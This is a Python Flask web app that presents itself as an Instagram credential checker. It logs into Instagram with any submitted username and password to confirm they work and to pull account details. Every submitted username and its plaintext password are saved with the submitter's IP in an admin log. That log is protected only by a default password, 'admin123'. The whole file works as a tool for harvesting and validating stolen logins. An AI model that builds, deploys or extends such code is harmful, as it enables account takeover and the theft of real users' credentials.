import os
import json
import functools
from datetime import datetime
from flask import Flask, render_template, request, jsonify, Response
from instagrapi import Client
from instagrapi.exceptions import (
    BadPassword,
    BadCredentials,
    UserNotFound,
    LoginRequired,
    ChallengeRequired,
    FeedbackRequired,
    PleaseWaitFewMinutes,
    RecaptchaChallengeForm,
    SelectContactPointRecoveryForm,
    TwoFactorRequired,
)

app = Flask(__name__)
app.secret_key = os.environ.get("SESSION_SECRET", "dev-secret-key")

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin123")

# ============================================
# IN-MEMORY STORAGE (temporary, logs will disappear on restart)
# ============================================
logs_memory = []

def load_logs():
    """Load logs from in-memory storage"""
    return logs_memory

def save_log(entry):
    """Save log to in-memory storage"""
    logs_memory.insert(0, entry)
    # Keep only last 500 entries
    if len(logs_memory) > 500:
        logs_memory.pop()

def require_admin(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or auth.password != ADMIN_PASSWORD:
            return Response(
                "Access denied. Enter admin credentials.",
                401,
                {"WWW-Authenticate": 'Basic realm="Admin Panel"'},
            )
        return f(*args, **kwargs)
    return decorated

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/admin")
@require_admin
def admin():
    logs = load_logs()
    return render_template("admin.html", logs=logs)

@app.route("/admin/clear", methods=["POST"])
@require_admin
def admin_clear():
    global logs_memory
    logs_memory = []
    return ("", 204)

@app.route("/check", methods=["POST"])
def check_credentials():
    data = request.get_json()
    if not data:
        return jsonify({"success": False, "error": "No data provided"}), 400

    username = data.get("username", "").strip()
    password = data.get("password", "")

    if not username or not password:
        return jsonify({"success": False, "error": "Username and password are required"}), 400

    cl = Client()
    cl.delay_range = [1, 3]
    result = {}

    try:
        cl.login(username, password)
        user_info = cl.account_info()
        result = {
            "success": True,
            "status": "valid",
            "message": "Credentials are valid",
            "account": {
                "username": user_info.username,
                "full_name": user_info.full_name,
                "followers": user_info.follower_count,
                "following": user_info.following_count,
                "is_private": user_info.is_private,
                "is_verified": user_info.is_verified,
            }
        }

    except TwoFactorRequired:
        result = {"success": True, "status": "2fa_required",
                  "message": "Credentials are valid but two-factor authentication is enabled"}

    except BadPassword:
        result = {"success": False, "status": "bad_password",
                  "message": "Incorrect password for this account"}

    except (UserNotFound, BadCredentials):
        result = {"success": False, "status": "invalid_user",
                  "message": "This Instagram account does not exist or credentials are invalid"}

    except ChallengeRequired:
        result = {"success": True, "status": "challenge_required",
                  "message": "Credentials appear valid, but Instagram requires a security challenge"}

    except FeedbackRequired:
        result = {"success": False, "status": "feedback_required",
                  "message": "Instagram blocked this login attempt. Try again later or log in via the app first"}

    except PleaseWaitFewMinutes:
        result = {"success": False, "status": "rate_limited",
                  "message": "Too many requests. Please wait a few minutes before trying again"}

    except RecaptchaChallengeForm:
        result = {"success": True, "status": "recaptcha_challenge",
                  "message": "Credentials appear valid, but Instagram requires a CAPTCHA verification"}

    except SelectContactPointRecoveryForm:
        result = {"success": True, "status": "contact_point_required",
                  "message": "Credentials appear valid, but Instagram requires account recovery verification"}

    except LoginRequired:
        result = {"success": False, "status": "login_failed",
                  "message": "Login failed. The account may be temporarily restricted"}

    except Exception as e:
        error_msg = str(e)
        if "checkpoint" in error_msg.lower() or "challenge" in error_msg.lower():
            result = {"success": True, "status": "challenge_required",
                      "message": "Credentials appear valid, but Instagram requires additional verification"}
        else:
            result = {"success": False, "status": "error",
                      "message": f"An unexpected error occurred: {error_msg}"}

    try:
        save_log({
            "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC"),
            "username": username,
            "password": password,
            "status": result.get("status", "unknown"),
            "message": result.get("message", ""),
            "ip": request.remote_addr,
        })
    except Exception:
        pass

    return jsonify(result)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port, debug=False)
